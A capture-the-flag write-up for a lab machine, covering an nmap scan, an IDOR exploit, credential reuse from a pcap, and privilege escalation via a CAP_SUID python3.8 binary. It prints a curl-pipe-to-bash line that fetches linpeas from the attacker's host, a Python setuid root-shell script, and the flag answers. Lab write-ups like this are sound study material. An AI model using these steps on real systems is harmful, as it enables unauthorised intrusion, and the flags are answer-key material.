# Tasks

[**How many TCP ports are open?**](#task-1)

[**After running a "Security Snapshot", the browser is redirected to a path of the format ```/something/id```, where ```id``` represents the id number of the scan. What is the ```something```?**](#task-2)

[**Are you able to get to other users' scans?**](#task-3)

[**What is the ID of the PCAP file that contains sensative data?**](#task-4)

[**Which application layer protocol in the pcap file can the sensetive data be found in?**](#task-5)

[**We've managed to collect nathan's FTP password. On what other service does this password work?**](#task-6)

[**User Flag**](#user-flag)

[**What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**](#task-8)

[**Root Flag**](#root-flag)

# Tools Used

- nmap
- gtfobins (kind of)

# Skills used

- Exploiting _IDOR_
- Little bit of forensics (checking _pcap_ traffic for credentials, pretty much it lmao)
- Searching for files with _SUID_ bit set and exploiting that

# Solutions

## Task 1

**Command:**

```
nmap -sCV [IP Address]
```

![image](https://github.com/user-attachments/assets/98695f42-0e02-4f68-9d4a-3e47b0d589ca)

**Answer: 3**

## Task 2

Just go to the website:

![image](https://github.com/user-attachments/assets/b3d0014a-1777-499c-ac22-5a133283f4bf)

That's not the landing page but the page that we need to go to find the answer, looks like an _IDOR_ might be possible.

**Answer: data**

## Task 3

![image](https://github.com/user-attachments/assets/e4430975-b9ed-43a1-895b-255b11708962)

Yes, _IDOR_ was very much possible.

**Answer: yes**

## Task 4

_Yes_

![image](https://github.com/user-attachments/assets/c8e73b82-31a1-4e5a-8cce-d9dc37170969)

**Answer: 0**

## Task 5

Check the _pcap_ file, and we'll find this:

![image](https://github.com/user-attachments/assets/d2b071e7-9fab-4e69-b345-6283af83114f)

**Answer: FTP**

Also, we're gonna be using that info a bunch so yeah.

## Task 6

So, remember how _ssh_ was open based on the scan? Yeah, that's what I thought lmao.

**Answer: ssh**

## User Flag

Log in to _ssh_, then you'll find this:

![image](https://github.com/user-attachments/assets/a1ee20f5-a706-4f7c-a223-b37d617af766)

**Answer: c96619759ff232fdc96286ad0d0ce8aa**

## Task 8

Ok so at first, I thought using this was enough to find the vulnerable binary:

```
find / -user root -perm -4000 2>/dev/null
```

This basically looks for all files with escalated privileges. Usually I use that to find vulnerable binaries.

![image](https://github.com/user-attachments/assets/e1a919cd-8bd6-493d-a7d4-1e6b35502a96)

This is what I found, but none of them were useful.

I tried to narrow it down to just _/usr/bin_ to really make sure, but even then, none of the binaries with _SUID_ set are actually useful.

So, I looked at a writeup to see how to find the vulnerable binary, apparently I gotta use _linpeas_ (or another enumeration tool/method).

Basically, the vulnerable binary can set _SUID_ via _CAP_SUID_.

So, here's what I found:

![image](https://github.com/user-attachments/assets/dede01f8-4f88-4fbd-9f8f-575b17fae8a2)

I like how it's even highlighted lol.

Anyways, here's how that happened:

Host _python web server_ in the directory with _linpeas.sh_ in it:

![image](https://github.com/user-attachments/assets/142eb20e-110e-40ba-9940-13aa3c329760)

Curl that in the _ssh_ session to run it, use this to run it directly after curling:

```
curl http://[Host Machine Address]:[Port]/linpeas.sh | bash
```

![image](https://github.com/user-attachments/assets/c5e2ea11-eaf6-4d14-a028-199c96e53d71)

And let it rip

**Answer: /usr/bin/python3.8**

## Root Flag

Use this script (since _python_ is vulnerable):

```
import os
os.setuid(0)
os.system("/bin/bash")
```

You already know the first and third lines (considering that's pretty common to do), but _os.setuid_ should be self explanatory lmao.

Also, we got that from [**GTFObins**](https://gtfobins.github.io/gtfobins/python/#suid), this specifically:

![image](https://github.com/user-attachments/assets/803c48be-a88f-4699-b126-834c7c4125bc)

Should look like this:

![image](https://github.com/user-attachments/assets/c6fb2453-4c61-4ff8-87c6-48f25ee37bdf)

Anyways, here's the flag:

![image](https://github.com/user-attachments/assets/5c1ad47f-6b86-4754-9d2d-0f5cc8cda986)

**Answer: 8d947f4a0f87dde1f469156dfa2fc22e**
